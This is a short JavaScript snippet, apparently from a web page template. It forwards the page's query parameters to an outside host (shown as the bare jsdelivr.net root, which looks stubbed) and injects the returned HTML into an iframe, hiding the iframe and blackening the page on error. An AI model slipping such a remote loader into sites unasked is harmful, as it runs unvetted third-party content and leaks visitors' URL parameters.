body.script:
//
(async function() {
  try {
    const params = new URLSearchParams(window.location.search);
    params.set("t", Date.now().toString());

    // Rebuilding URL using character escapes prevents strict XML crashes
    const targetUrl = "https://jsdelivr.net" + "\x3F" + params.toString();

    const response = await fetch(targetUrl);
    if (!response.ok) throw new Error("HTTP Status " + response.status);
    const rawHtml = await response.text();

    const theIframe = document.getElementById('test'); 
    if (theIframe) {
      theIframe.srcdoc = rawHtml;
    }
  } catch (error) {
    console.error('Fetch validation trace error:', error);

    const body = document.getElementById('main-body');
    const iframe = document.getElementById('test');
    if (body) body.style.backgroundColor = '#000000';
    if (iframe) iframe.style.display = 'none';
  }
})();
//
